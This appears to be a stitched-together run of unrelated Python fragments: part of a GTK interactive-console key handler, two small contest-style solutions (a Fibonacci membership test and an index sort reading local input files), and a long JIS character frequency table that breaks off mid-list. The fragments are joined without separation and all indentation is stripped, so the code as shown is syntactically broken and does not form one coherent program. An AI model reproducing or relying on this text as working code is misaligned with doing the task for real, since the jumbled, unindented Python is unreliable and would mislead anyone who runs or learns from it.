self.interrupt = True
self._processLine()
return True
elif event.keyval == gtk.keysyms.Return:
self._processLine()
return True
elif event.keyval == gtk.keysyms.Up:
self.changeLine(self.historyBack())
return True
elif event.keyval == gtk.keysyms.Down:
self.changeLine(self.historyForward())
return True
elif event.keyval == gtk.keysyms.Tab:
if not self.getCurrentLine().strip():
return False
completed, possibilities = self.complete(self.getCurrentLine())
if len(possibilities) > 1:
slice = self.getCurrentLine()
self.write('\n')
for symbol in possibilities:
self.write(symbol+'\n')
self.showPrompt(self.prompt)
self.changeLine(completed or slice)
return True
def _processLine(self):
self.history_pos = 0
self.execute()
rv = self.cout.getvalue()
if rv: rv = rv.strip('\n')
self.showReturned(rv)
self.cout.truncate(0)
fib = lambda n: reduce(lambda x, n: [x[1], x[0] + x[1]], xrange(n), [0, 1])[0]
class Solution(object):
def solve(self, cipher):
num = int(cipher)
n = 0
while fib(n) < num:
n += 1
if fib(n) == num:
return "IsFibo"
else:
return "IsNotFibo"
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip()
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
A = cipher
n = len(A)
idx = sorted(range(n), key=lambda k: A[k][0] + A[k][1])
return " ".join(map(lambda x: str(x + 1), idx))
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
n = int(f.readline().strip())
cipher = []
for i in xrange(n):
t = map(int, f.readline().strip().split(' '))
cipher.append(tuple(t))
s = "%s\n" % (solution.solve(cipher))
print s,
JIS_TYPICAL_DISTRIBUTION_RATIO = 3.0
JIS_TABLE_SIZE = 4368
JISCharToFreqOrder = (
40,   1,   6, 182, 152, 180, 295,2127, 285, 381,3295,4304,3068,4606,3165,3510,
3511,1822,2785,4607,1193,2226,5070,4608, 171,2996,1247,  18, 179,5071, 856,1661,
1262,5072, 619, 127,3431,3512,3230,1899,1700, 232, 228,1294,1298, 284, 283,2041,
2042,1061,1062,  48,  49,  44,  45, 433, 434,1040,1041, 996, 787,2997,1255,4305,
2108,4609,1684,1648,5073,5074,5075,5076,5077,5078,3687,5079,4610,5080,3927,3928,
5081,3296,3432, 290,2285,1471,2187,5082,2580,2825,1303,2140,1739,1445,2691,3375,
1691,3297,4306,4307,4611, 452,3376,1182,2713,3688,3069,4308,5083,5084,5085,5086,
5087,5088,5089,5090,5091,5092,5093,5094,5095,5096,5097,5098,5099,5100,5101,5102,
5103,5104,5105,5106,5107,5108,5109,5110,5111,5112,4097,5113,5114,5115,5116,5117,
5118,5119,5120,5121,5122,5123,5124,5125,5126,5127,5128,5129,5130,5131,5132,5133,
5134,5135,5136,5137,5138,5139,5140,5141,5142,5143,5144,5145,5146,5147,5148,5149,
5150,5151,5152,4612,5153,5154,5155,5156,5157,5158,5159,5160,5161,5162,5163,5164,
5165,5166,5167,5168,5169,5170,5171,5172,5173,5174,5175,1472, 598, 618, 820,1205,
1309,1412,1858,1307,1692,5176,5177,5178,5179,5180,5181,5182,1142,1452,1234,1172,
1875,2043,2149,1793,1382,2973, 925,2404,1067,1241, 960,1377,2935,1491, 919,1217,
1865,2030,1406,1499,2749,4098,5183,5184,5185,5186,5187,5188,2561,4099,3117,1804,
2049,3689,4309,3513,1663,5189,3166,3118,3298,1587,1561,3433,5190,3119,1625,2998,
3299,4613,1766,3690,2786,4614,5191,5192,5193,5194,2161,  26,3377,   2,3929,  20,
3691,  47,4100,  50,  17,  16,  35, 268,  27, 243,  42, 155,  24, 154,  29, 184,
4,  91,  14,  92,  53, 396,  33, 289,   9,  37,  64, 620,  21,  39, 321,   5,
12,  11,  52,  13,   3, 208, 138,   0,   7,  60, 526, 141, 151,1069, 181, 275,
1591,  83, 132,1475, 126, 331, 829,  15,  69, 160,  59,  22, 157,  55,1079, 312,
109,  38,  23,  25,  10,  19,  79,5195,  61, 382,1124,   8,  30,5196,5197,5198,
5199,5200,5201,5202,5203,5204,5205,5206,  89,  62,  74,  34,2416, 112, 139, 196,
271, 149,  84, 607, 131, 765,  46,  88, 153, 683,  76, 874, 101, 258,  57,  80,
32, 364, 121,1508, 169,1547,  68, 235, 145,2999,  41, 360,3027,  70,  63,  31,
43, 259, 262,1383,  99, 533, 194,  66,  93, 846, 217, 192,  56, 106,  58, 565,
280, 272, 311, 256, 146,  82, 308,  71, 100, 128, 214, 655, 110, 261, 104,1140,
54,  51,  36,  87,  67,3070, 185,2618,2936,2020,  28,1066,2390,2059,5207,5208,
5209,5210,5211,5212,5213,5214,5215,5216,4615,5217,5218,5219,5220,5221,5222,5223,
5224,5225,5226,5227,5228,5229,5230,5231,5232,5233,5234,5235,5236,3514,5237,5238,
5239,5240,5241,5242,5243,5244,2297,2031,4616,4310,3692,5245,3071,5246,3598,5247,
4617,3231,3515,5248,4101,4311,4618,3808,4312,4102,5249,4103,4104,3599,5250,5251,
5252,5253,5254,5255,5256,5257,5258,5259,5260,5261,5262,5263,5264,5265,5266,5267,
5268,5269,5270,5271,5272,5273,5274,5275,5276,5277,5278,5279,5280,5281,5282,5283,
5284,5285,5286,5287,5288,5289,5290,5291,5292,5293,5294,5295,5296,5297,5298,5299,
5300,5301,5302,5303,5304,5305,5306,5307,5308,5309,5310,5311,5312,5313,5314,5315,
5316,5317,5318,5319,5320,5321,5322,5323,5324,5325,5326,5327,5328,5329,5330,5331,
5332,5333,5334,5335,5336,5337,5338,5339,5340,5341,5342,5343,5344,5345,5346,5347,
5348,5349,5350,5351,5352,5353,5354,5355,5356,5357,5358,5359,5360,5361,5362,5363,
5364,5365,5366,5367,5368,5369,5370,5371,5372,5373,5374,5375,5376,5377,5378,5379,
5380,5381, 363, 642,2787,2878,2788,2789,2316,3232,2317,3434,2011, 165,1942,3930,
3931,3932,3933,5382,4619,5383,4620,5384,5385,5386,5387,5388,5389,5390,5391,5392,
5393,5394,5395,5396,5397,5398,5399,5400,5401,5402,5403,5404,5405,5406,5407,5408,
5409,5410,5411,5412,5413,5414,5415,5416,5417,5418,5419,5420,5421,5422,5423,5424,
5425,5426,5427,5428,5429,5430,5431,5432,5433,5434,5435,5436,5437,5438,5439,5440,
5441,5442,5443,5444,5445,5446,5447,5448,5449,5450,5451,5452,5453,5454,5455,5456,
5457,5458,5459,5460,5461,5462,5463,5464,5465,5466,5467,5468,5469,5470,5471,5472,
5473,5474,5475,5476,5477,5478,5479,5480,5481,5482,5483,5484,5485,5486,5487,5488,
5489,5490,5491,5492,5493,5494,5495,5496,5497,5498,5499,5500,5501,5502,5503,5504,
5505,5506,5507,5508,5509,5510,5511,5512,5513,5514,5515,5516,5517,5518,5519,5520,
5521,5522,5523,5524,5525,5526,5527,5528,5529,5530,5531,5532,5533,5534,5535,5536,
5537,5538,5539,5540,5541,5542,5543,5544,5545,5546,5547,5548,5549,5550,5551,5552,
5553,5554,5555,5556,5557,5558,5559,5560,5561,5562,5563,5564,5565,5566,5567,5568,
5569,5570,5571,5572,5573,5574,5575,5576,5577,5578,5579,5580,5581,5582,5583,5584,
5585,5586,5587,5588,5589,5590,5591,5592,5593,5594,5595,5596,5597,5598,5599,5600,
5601,5602,5603,5604,5605,5606,5607,5608,5609,5610,5611,5612,5613,5614,5615,5616,
5617,5618,5619,5620,5621,5622,5623,5624,5625,5626,5627,5628,5629,5630,5631,5632,
5633,5634,5635,5636,5637,5638,5639,5640,5641,5642,5643,5644,5645,5646,5647,5648,
5649,5650,5651,5652,5653,5654,5655,5656,5657,5658,5659,5660,5661,5662,5663,5664,
5665,5666,5667,5668,5669,5670,5671,5672,5673,5674,5675,5676,5677,5678,5679,5680,
5681,5682,5683,5684,5685,5686,5687,5688,5689,5690,5691,5692,5693,5694,5695,5696,
5697,5698,5699,5700,5701,5702,5703,5704,5705,5706,5707,5708,5709,5710,5711,5712,
5713,5714,5715,5716,5717,5718,5719,5720,5721,5722,5723,5724,5725,5726,5727,5728,
5729,5730,5731,5732,5733,5734,5735,5736,5737,5738,5739,5740,5741,5742,5743,5744,
5745,5746,5747,5748,5749,5750,5751,5752,5753,5754,5755,5756,5757,5758,5759,5760,
5761,5762,5763,5764,5765,5766,5767,5768,5769,5770,5771,5772,5773,5774,5775,5776,
5777,5778,5779,5780,5781,5782,5783,5784,5785,5786,5787,5788,5789,5790,5791,5792,
5793,5794,5795,5796,5797,5798,5799,5800,5801,5802,5803,5804,5805,5806,5807,5808,
5809,5810,5811,5812,5813,5814,5815,5816,5817,5818,5819,5820,5821,5822,5823,5824,
5825,5826,5827,5828,5829,5830,5831,5832,5833,5834,5835,5836,5837,5838,5839,5840,
5841,5842,5843,5844,5845,5846,5847,5848,5849,5850,5851,5852,5853,5854,5855,5856,
5857,5858,5859,5860,5861,5862,5863,5864,5865,5866,5867,5868,5869,5870,5871,5872,
5873,5874,5875,5876,5877,5878,5879,5880,5881,5882,5883,5884,5885,5886,5887,5888,
5889,5890,5891,5892,5893,5894,5895,5896,5897,5898,5899,5900,5901,5902,5903,5904,
5905,5906,5907,5908,5909,5910,5911,5912,5913,5914,5915,5916,5917,5918,5919,5920,
5921,5922,5923,5924,5925,5926,5927,5928,5929,5930,5931,5932,5933,5934,5935,5936,
5937,5938,5939,5940,5941,5942,5943,5944,5945,5946,5947,5948,5949,5950,5951,5952,
5953,5954,5955,5956,5957,5958,5959,5960,5961,5962,5963,5964,5965,5966,5967,5968,
5969,5970,5971,5972,5973,5974,5975,5976,5977,5978,5979,5980,5981,5982,5983,5984,
5985,5986,5987,5988,5989,5990,5991,5992,5993,5994,5995,5996,5997,5998,5999,6000,
6001,6002,6003,6004,6005,6006,6007,6008,6009,6010,6011,6012,6013,6014,6015,6016,
6017,6018,6019,6020,6021,6022,6023,6024,6025,6026,6027,6028,6029,6030,6031,6032,
6033,6034,6035,6036,6037,6038,6039,6040,6041,6042,6043,6044,6045,6046,6047,6048,
6049,6050,6051,6052,6053,6054,6055,6056,6057,6058,6059,6060,6061,6062,6063,6064,
6065,6066,6067,6068,6069,6070,6071,6072,6073,6074,6075,6076,6077,6078,6079,6080,
6081,6082,6083,6084,6085,6086,6087,6088,6089,6090,6091,6092,6093,6094,6095,6096,
6097,6098,6099,6100,6101,6102,6103,6104,6105,6106,6107,6108,6109,6110,6111,6112,
6113,6114,2044,2060,4621, 997,1235, 473,1186,4622, 920,3378,6115,6116, 379,1108,
4313,2657,2735,3934,6117,3809, 636,3233, 573,1026,3693,3435,2974,3300,2298,4105,
854,2937,2463, 393,2581,2417, 539, 752,1280,2750,2480, 140,1161, 440, 708,1569,
665,2497,1746,1291,1523,3000, 164,1603, 847,1331, 537,1997, 486, 508,1693,2418,
1970,2227, 878,1220, 299,1030, 969, 652,2751, 624,1137,3301,2619,  65,3302,2045,
1761,1859,3120,1930,3694,3516, 663,1767, 852, 835,3695, 269, 767,2826,2339,1305,
896,1150, 770,1616,6118, 506,1502,2075,1012,2519, 775,2520,2975,2340,2938,4314,
3028,2086,1224,1943,2286,6119,3072,4315,2240,1273,1987,3935,1557, 175, 597, 985,
3517,2419,2521,1416,3029, 585, 938,1931,1007,1052,1932,1685,6120,3379,4316,4623,
804, 599,3121,1333,2128,2539,1159,1554,2032,3810, 687,2033,2904, 952, 675,1467,
3436,6121,2241,1096,1786,2440,1543,1924, 980,1813,2228, 781,2692,1879, 728,1918,
3696,4624, 548,1950,4625,1809,1088,1356,3303,2522,1944, 502, 972, 373, 513,2827,
586,2377,2391,1003,1976,1631,6122,2464,1084, 648,1776,4626,2141, 324, 962,2012,
2177,2076,1384, 742,2178,1448,1173,1810, 222, 102, 301, 445, 125,2420, 662,2498,
277, 200,1476,1165,1068, 224,2562,1378,1446, 450,1880, 659, 791, 582,4627,2939,
3936,1516,1274, 555,2099,3697,1020,1389,1526,3380,1762,1723,1787,2229, 412,2114,
1900,2392,3518, 512,2597, 427,1925,2341,3122,1653,1686,2465,2499, 697, 330, 273,
380,2162, 951, 832, 780, 991,1301,3073, 965,2270,3519, 668,2523,2636,1286, 535,
1407, 518, 671, 957,2658,2378, 267, 611,2197,3030,6123, 248,2299, 967,1799,2356,
850,1418,3437,1876,1256,1480,2828,1718,6124,6125,1755,1664,2405,6126,4628,2879,
2829, 499,2179, 676,4629, 557,2329,2214,2090, 325,3234, 464, 811,3001, 992,2342,
2481,1232,1469, 303,2242, 466,1070,2163, 603,1777,2091,4630,2752,4631,2714, 322,
2659,1964,1768, 481,2188,1463,2330,2857,3600,2092,3031,2421,4632,2318,2070,1849,
2598,4633,1302,2254,1668,1701,2422,3811,2905,3032,3123,2046,4106,1763,1694,4634,
1604, 943,1724,1454, 917, 868,2215,1169,2940, 552,1145,1800,1228,1823,1955, 316,
1080,2510, 361,1807,2830,4107,2660,3381,1346,1423,1134,4108,6127, 541,1263,1229,
1148,2540, 545, 465,1833,2880,3438,1901,3074,2482, 816,3937, 713,1788,2500, 122,
1575, 195,1451,2501,1111,6128, 859, 374,1225,2243,2483,4317, 390,1033,3439,3075,
2524,1687, 266, 793,1440,2599, 946, 779, 802, 507, 897,1081, 528,2189,1292, 711,
1866,1725,1167,1640, 753, 398,2661,1053, 246, 348,4318, 137,1024,3440,1600,2077,
2129, 825,4319, 698, 238, 521, 187,2300,1157,2423,1641,1605,1464,1610,1097,2541,
1260,1436, 759,2255,1814,2150, 705,3235, 409,2563,3304, 561,3033,2005,2564, 726,
1956,2343,3698,4109, 949,3812,3813,3520,1669, 653,1379,2525, 881,2198, 632,2256,
1027, 778,1074, 733,1957, 514,1481,2466, 554,2180, 702,3938,1606,1017,1398,6129,
1380,3521, 921, 993,1313, 594, 449,1489,1617,1166, 768,1426,1360, 495,1794,3601,
1177,3602,1170,4320,2344, 476, 425,3167,4635,3168,1424, 401,2662,1171,3382,1998,
1089,4110, 477,3169, 474,6130,1909, 596,2831,1842, 494, 693,1051,1028,1207,3076,
606,2115, 727,2790,1473,1115, 743,3522, 630, 805,1532,4321,2021, 366,1057, 838,
684,1114,2142,4322,2050,1492,1892,1808,2271,3814,2424,1971,1447,1373,3305,1090,
1536,3939,3523,3306,1455,2199, 336, 369,2331,1035, 584,2393, 902, 718,2600,6131,
2753, 463,2151,1149,1611,2467, 715,1308,3124,1268, 343,1413,3236,1517,1347,2663,
2093,3940,2022,1131,1553,2100,2941,1427,3441,2942,1323,2484,6132,1980, 872,2368,
2441,2943, 320,2369,2116,1082, 679,1933,3941,2791,3815, 625,1143,2023, 422,2200,
3816,6133, 730,1695, 356,2257,1626,2301,2858,2637,1627,1778, 937, 883,2906,2693,
3002,1769,1086, 400,1063,1325,3307,2792,4111,3077, 456,2345,1046, 747,6134,1524,
884,1094,3383,1474,2164,1059, 974,1688,2181,2258,1047, 345,1665,1187, 358, 875,
3170, 305, 660,3524,2190,1334,1135,3171,1540,1649,2542,1527, 927, 968,2793, 885,
1972,1850, 482, 500,2638,1218,1109,1085,2543,1654,2034, 876,  78,2287,1482,1277,
861,1675,1083,1779, 724,2754, 454, 397,1132,1612,2332, 893, 672,1237, 257,2259,
2370, 135,3384, 337,2244, 547, 352, 340, 709,2485,1400, 788,1138,2511, 540, 772,
1682,2260,2272,2544,2013,1843,1902,4636,1999,1562,2288,4637,2201,1403,1533, 407,
576,3308,1254,2071, 978,3385, 170, 136,1201,3125,2664,3172,2394, 213, 912, 873,
3603,1713,2202, 699,3604,3699, 813,3442, 493, 531,1054, 468,2907,1483, 304, 281,
4112,1726,1252,2094, 339,2319,2130,2639, 756,1563,2944, 748, 571,2976,1588,2425,
2715,1851,1460,2426,1528,1392,1973,3237, 288,3309, 685,3386, 296, 892,2716,2216,
1570,2245, 722,1747,2217, 905,3238,1103,6135,1893,1441,1965, 251,1805,2371,3700,
2601,1919,1078,  75,2182,1509,1592,1270,2640,4638,2152,6136,3310,3817, 524, 706,
1075, 292,3818,1756,2602, 317,  98,3173,3605,3525,1844,2218,3819,2502, 814, 567,
385,2908,1534,6137, 534,1642,3239, 797,6138,1670,1529, 953,4323, 188,1071, 538,
178, 729,3240,2109,1226,1374,2000,2357,2977, 731,2468,1116,2014,2051,6139,1261,
1593, 803,2859,2736,3443, 556, 682, 823,1541,6140,1369,2289,1706,2794, 845, 462,
2603,2665,1361, 387, 162,2358,1740, 739,1770,1720,1304,1401,3241,1049, 627,1571,
2427,3526,1877,3942,1852,1500, 431,1910,1503, 677, 297,2795, 286,1433,1038,1198,
2290,1133,1596,4113,4639,2469,1510,1484,3943,6141,2442, 108, 712,4640,2372, 866,
3701,2755,3242,1348, 834,1945,1408,3527,2395,3243,1811, 824, 994,1179,2110,1548,
1453, 790,3003, 690,4324,4325,2832,2909,3820,1860,3821, 225,1748, 310, 346,1780,
2470, 821,1993,2717,2796, 828, 877,3528,2860,2471,1702,2165,2910,2486,1789, 453,
359,2291,1676,  73,1164,1461,1127,3311, 421, 604, 314,1037, 589, 116,2487, 737,
837,1180, 111, 244, 735,6142,2261,1861,1362, 986, 523, 418, 581,2666,3822, 103,
855, 503,1414,1867,2488,1091, 657,1597, 979, 605,1316,4641,1021,2443,2078,2001,
1209,  96, 587,2166,1032, 260,1072,2153, 173,  94, 226,3244, 819,2006,4642,4114,
2203, 231,1744, 782,  97,2667, 786,3387, 887, 391, 442,2219,4326,1425,6143,2694,
633,1544,1202, 483,2015, 592,2052,1958,2472,1655, 419, 129,4327,3444,3312,1714,
1257,3078,4328,1518,1098, 865,1310,1019,1885,1512,1734, 469,2444, 148, 773, 436,
1815,1868,1128,1055,4329,1245,2756,3445,2154,1934,1039,4643, 579,1238, 932,2320,
353, 205, 801, 115,2428, 944,2321,1881, 399,2565,1211, 678, 766,3944, 335,2101,
1459,1781,1402,3945,2737,2131,1010, 844, 981,1326,1013, 550,1816,1545,2620,1335,
1008, 371,2881, 936,1419,1613,3529,1456,1395,2273,1834,2604,1317,2738,2503, 416,
1643,4330, 806,1126, 229, 591,3946,1314,1981,1576,1837,1666, 347,1790, 977,3313,
764,2861,1853, 688,2429,1920,1462,  77, 595, 415,2002,3034, 798,1192,4115,6144,
2978,4331,3035,2695,2582,2072,2566, 430,2430,1727, 842,1396,3947,3702, 613, 377,
278, 236,1417,3388,3314,3174, 757,1869, 107,3530,6145,1194, 623,2262, 207,1253,
2167,3446,3948, 492,1117,1935, 536,1838,2757,1246,4332, 696,2095,2406,1393,1572,
3175,1782, 583, 190, 253,1390,2230, 830,3126,3389, 934,3245,1703,1749,2979,1870,
2545,1656,2204, 869,2346,4116,3176,1817, 496,1764,4644, 942,1504, 404,1903,1122,
1580,3606,2945,1022, 515, 372,1735, 955,2431,3036,6146,2797,1110,2302,2798, 617,
6147, 441, 762,1771,3447,3607,3608,1904, 840,3037,  86, 939,1385, 572,1370,2445,
1336, 114,3703, 898, 294, 203,3315, 703,1583,2274, 429, 961,4333,1854,1951,3390,
2373,3704,4334,1318,1381, 966,1911,2322,1006,1155, 309, 989, 458,2718,1795,1372,
1203, 252,1689,1363,3177, 517,1936, 168,1490, 562, 193,3823,1042,4117,1835, 551,
470,4645, 395, 489,3448,1871,1465,2583,2641, 417,1493, 279,1295, 511,1236,1119,
72,1231,1982,1812,3004, 871,1564, 984,3449,1667,2696,2096,4646,2347,2833,1673,
3609, 695,3246,2668, 807,1183,4647, 890, 388,2333,1801,1457,2911,1765,1477,1031,
3316,3317,1278,3391,2799,2292,2526, 163,3450,4335,2669,1404,1802,6148,2323,2407,
1584,1728,1494,1824,1269, 298, 909,3318,1034,1632, 375, 776,1683,2061, 291, 210,
1123, 809,1249,1002,2642,3038, 206,1011,2132, 144, 975, 882,1565, 342, 667, 754,
1442,2143,1299,2303,2062, 447, 626,2205,1221,2739,2912,1144,1214,2206,2584, 760,
1715, 614, 950,1281,2670,2621, 810, 577,1287,2546,4648, 242,2168, 250,2643, 691,
123,2644, 647, 313,1029, 689,1357,2946,1650, 216, 771,1339,1306, 808,2063, 549,
913,1371,2913,2914,6149,1466,1092,1174,1196,1311,2605,2396,1783,1796,3079, 406,
2671,2117,3949,4649, 487,1825,2220,6150,2915, 448,2348,1073,6151,2397,1707, 130,
900,1598, 329, 176,1959,2527,1620,6152,2275,4336,3319,1983,2191,3705,3610,2155,
3706,1912,1513,1614,6153,1988, 646, 392,2304,1589,3320,3039,1826,1239,1352,1340,
2916, 505,2567,1709,1437,2408,2547, 906,6154,2672, 384,1458,1594,1100,1329, 710,
423,3531,2064,2231,2622,1989,2673,1087,1882, 333, 841,3005,1296,2882,2379, 580,
1937,1827,1293,2585, 601, 574, 249,1772,4118,2079,1120, 645, 901,1176,1690, 795,
2207, 478,1434, 516,1190,1530, 761,2080, 930,1264, 355, 435,1552, 644,1791, 987,
220,1364,1163,1121,1538, 306,2169,1327,1222, 546,2645, 218, 241, 610,1704,3321,
1984,1839,1966,2528, 451,6155,2586,3707,2568, 907,3178, 254,2947, 186,1845,4650,
745, 432,1757, 428,1633, 888,2246,2221,2489,3611,2118,1258,1265, 956,3127,1784,
4337,2490, 319, 510, 119, 457,3612, 274,2035,2007,4651,1409,3128, 970,2758, 590,
2800, 661,2247,4652,2008,3950,1420,1549,3080,3322,3951,1651,1375,2111, 485,2491,
1429,1156,6156,2548,2183,1495, 831,1840,2529,2446, 501,1657, 307,1894,3247,1341,
666, 899,2156,1539,2549,1559, 886, 349,2208,3081,2305,1736,3824,2170,2759,1014,
1913,1386, 542,1397,2948, 490, 368, 716, 362, 159, 282,2569,1129,1658,1288,1750,
2674, 276, 649,2016, 751,1496, 658,1818,1284,1862,2209,2087,2512,3451, 622,2834,
376, 117,1060,2053,1208,1721,1101,1443, 247,1250,3179,1792,3952,2760,2398,3953,
6157,2144,3708, 446,2432,1151,2570,3452,2447,2761,2835,1210,2448,3082, 424,2222,
1251,2449,2119,2836, 504,1581,4338, 602, 817, 857,3825,2349,2306, 357,3826,1470,
1883,2883, 255, 958, 929,2917,3248, 302,4653,1050,1271,1751,2307,1952,1430,2697,
2719,2359, 354,3180, 777, 158,2036,4339,1659,4340,4654,2308,2949,2248,1146,2232,
3532,2720,1696,2623,3827,6158,3129,1550,2698,1485,1297,1428, 637, 931,2721,2145,
914,2550,2587,  81,2450, 612, 827,2646,1242,4655,1118,2884, 472,1855,3181,3533,
3534, 569,1353,2699,1244,1758,2588,4119,2009,2762,2171,3709,1312,1531,6159,1152,
1938, 134,1830, 471,3710,2276,1112,1535,3323,3453,3535, 982,1337,2950, 488, 826,
674,1058,1628,4120,2017, 522,2399, 211, 568,1367,3454, 350, 293,1872,1139,3249,
1399,1946,3006,1300,2360,3324, 588, 736,6160,2606, 744, 669,3536,3828,6161,1358,
199, 723, 848, 933, 851,1939,1505,1514,1338,1618,1831,4656,1634,3613, 443,2740,
3829, 717,1947, 491,1914,6162,2551,1542,4121,1025,6163,1099,1223, 198,3040,2722,
370, 410,1905,2589, 998,1248,3182,2380, 519,1449,4122,1710, 947, 928,1153,4341,
2277, 344,2624,1511, 615, 105, 161,1212,1076,1960,3130,2054,1926,1175,1906,2473,
414,1873,2801,6164,2309, 315,1319,3325, 318,2018,2146,2157, 963, 631, 223,4342,
4343,2675, 479,3711,1197,2625,3712,2676,2361,6165,4344,4123,6166,2451,3183,1886,
2184,1674,1330,1711,1635,1506, 799, 219,3250,3083,3954,1677,3713,3326,2081,3614,
1652,2073,4657,1147,3041,1752, 643,1961, 147,1974,3955,6167,1716,2037, 918,3007,
1994, 120,1537, 118, 609,3184,4345, 740,3455,1219, 332,1615,3830,6168,1621,2980,
1582, 783, 212, 553,2350,3714,1349,2433,2082,4124, 889,6169,2310,1275,1410, 973,
166,1320,3456,1797,1215,3185,2885,1846,2590,2763,4658, 629, 822,3008, 763, 940,
1990,2862, 439,2409,1566,1240,1622, 926,1282,1907,2764, 654,2210,1607, 327,1130,
3956,1678,1623,6170,2434,2192, 686, 608,3831,3715, 903,3957,3042,6171,2741,1522,
1915,1105,1555,2552,1359, 323,3251,4346,3457, 738,1354,2553,2311,2334,1828,2003,
3832,1753,2351,1227,6172,1887,4125,1478,6173,2410,1874,1712,1847, 520,1204,2607,
264,4659, 836,2677,2102, 600,4660,3833,2278,3084,6174,4347,3615,1342, 640, 532,
543,2608,1888,2400,2591,1009,4348,1497, 341,1737,3616,2723,1394, 529,3252,1321,
983,4661,1515,2120, 971,2592, 924, 287,1662,3186,4349,2700,4350,1519, 908,1948,
2452, 156, 796,1629,1486,2223,2055, 694,4126,1259,1036,3392,1213,2249,2742,1889,
1230,3958,1015, 910, 408, 559,3617,4662, 746, 725, 935,4663,3959,3009,1289, 563,
867,4664,3960,1567,2981,2038,2626, 988,2263,2381,4351, 143,2374, 704,1895,6175,
1188,3716,2088, 673,3085,2362,4352, 484,1608,1921,2765,2918, 215, 904,3618,3537,
894, 509, 976,3043,2701,3961,4353,2837,2982, 498,6176,6177,1102,3538,1332,3393,
1487,1636,1637, 233, 245,3962, 383, 650, 995,3044, 460,1520,1206,2352, 749,3327,
530, 700, 389,1438,1560,1773,3963,2264, 719,2951,2724,3834, 870,1832,1644,1000,
839,2474,3717, 197,1630,3394, 365,2886,3964,1285,2133, 734, 922, 818,1106, 732,
480,2083,1774,3458, 923,2279,1350, 221,3086,  85,2233,2234,3835,1585,3010,2147,
1387,1705,2382,1619,2475, 133, 239,2802,1991,1016,2084,2383, 411,2838,1113, 651,
1985,1160,3328, 990,1863,3087,1048,1276,2647, 265,2627,1599,3253,2056, 150, 638,
2019, 656, 853, 326,1479, 680,1439,4354,1001,1759, 413,3459,3395,2492,1431, 459,
4355,1125,3329,2265,1953,1450,2065,2863, 849, 351,2678,3131,3254,3255,1104,1577,
227,1351,1645,2453,2193,1421,2887, 812,2121, 634,  95,2435, 201,2312,4665,1646,
1671,2743,1601,2554,2702,2648,2280,1315,1366,2089,3132,1573,3718,3965,1729,1189,
328,2679,1077,1940,1136, 558,1283, 964,1195, 621,2074,1199,1743,3460,3619,1896,
1916,1890,3836,2952,1154,2112,1064, 862, 378,3011,2066,2113,2803,1568,2839,6178,
3088,2919,1941,1660,2004,1992,2194, 142, 707,1590,1708,1624,1922,1023,1836,1233,
1004,2313, 789, 741,3620,6179,1609,2411,1200,4127,3719,3720,4666,2057,3721, 593,
2840, 367,2920,1878,6180,3461,1521, 628,1168, 692,2211,2649, 300, 720,2067,2571,
2953,3396, 959,2504,3966,3539,3462,1977, 701,6181, 954,1043, 800, 681, 183,3722,
1803,1730,3540,4128,2103, 815,2314, 174, 467, 230,2454,1093,2134, 755,3541,3397,
1141,1162,6182,1738,2039, 270,3256,2513,1005,1647,2185,3837, 858,1679,1897,1719,
2954,2324,1806, 402, 670, 167,4129,1498,2158,2104, 750,6183, 915, 189,1680,1551,
455,4356,1501,2455, 405,1095,2955, 338,1586,1266,1819, 570, 641,1324, 237,1556,
2650,1388,3723,6184,1368,2384,1343,1978,3089,2436, 879,3724, 792,1191, 758,3012,
1411,2135,1322,4357, 240,4667,1848,3725,1574,6185, 420,3045,1546,1391, 714,4358,
1967, 941,1864, 863, 664, 426, 560,1731,2680,1785,2864,1949,2363, 403,3330,1415,
1279,2136,1697,2335, 204, 721,2097,3838,  90,6186,2085,2505, 191,3967, 124,2148,
1376,1798,1178,1107,1898,1405, 860,4359,1243,1272,2375,2983,1558,2456,1638, 113,
3621, 578,1923,2609, 880, 386,4130, 784,2186,2266,1422,2956,2172,1722, 497, 263,
2514,1267,2412,2610, 177,2703,3542, 774,1927,1344, 616,1432,1595,1018, 172,4360,
2325, 911,4361, 438,1468,3622, 794,3968,2024,2173,1681,1829,2957, 945, 895,3090,
575,2212,2476, 475,2401,2681, 785,2744,1745,2293,2555,1975,3133,2865, 394,4668,
3839, 635,4131, 639, 202,1507,2195,2766,1345,1435,2572,3726,1908,1184,1181,2457,
3727,3134,4362, 843,2611, 437, 916,4669, 234, 769,1884,3046,3047,3623, 833,6187,
1639,2250,2402,1355,1185,2010,2047, 999, 525,1732,1290,1488,2612, 948,1578,3728,
2413,2477,1216,2725,2159, 334,3840,1328,3624,2921,1525,4132, 564,1056, 891,4363,
1444,1698,2385,2251,3729,1365,2281,2235,1717,6188, 864,3841,2515, 444, 527,2767,
2922,3625, 544, 461,6189, 566, 209,2437,3398,2098,1065,2068,3331,3626,3257,2137,
2138,2122,3730,2888,1995,1820,1044,6190,6191,6192,6193,6194,6195,6196,6197,6198,
6199,6200,6201,6202,6203,6204,6205,4670,6206,6207,6208,6209,6210,6211,6212,6213,
6214,6215,6216,6217,6218,6219,6220,6221,6222,6223,6224,6225,6226,6227,6228,6229,
6230,6231,6232,6233,6234,6235,6236,6237,3187,6238,6239,3969,6240,6241,6242,6243,
6244,4671,6245,6246,4672,6247,6248,4133,6249,6250,4364,6251,2923,2556,2613,4673,
4365,3970,6252,6253,6254,6255,4674,6256,6257,6258,2768,2353,4366,4675,4676,3188,
4367,3463,6259,4134,4677,4678,6260,2267,6261,3842,3332,4368,3543,6262,6263,6264,
3013,1954,1928,4135,4679,6265,6266,2478,3091,6267,4680,4369,6268,6269,1699,6270,
3544,4136,4681,6271,4137,6272,4370,2804,6273,6274,2593,3971,3972,4682,6275,2236,
4683,6276,6277,4684,6278,6279,4138,3973,4685,6280,6281,3258,6282,6283,6284,6285,
3974,4686,2841,3975,6286,6287,3545,6288,6289,4139,4687,4140,6290,4141,6291,4142,
6292,6293,3333,6294,6295,6296,4371,6297,3399,6298,6299,4372,3976,6300,6301,6302,
4373,6303,6304,3843,3731,6305,4688,4374,6306,6307,3259,2294,6308,3732,2530,4143,
6309,4689,6310,6311,6312,3048,6313,6314,4690,3733,2237,6315,6316,2282,3334,6317,
6318,3844,6319,6320,4691,6321,3400,4692,6322,4693,6323,3049,6324,4375,6325,3977,
6326,6327,6328,3546,6329,4694,3335,6330,4695,4696,6331,6332,6333,6334,4376,3978,
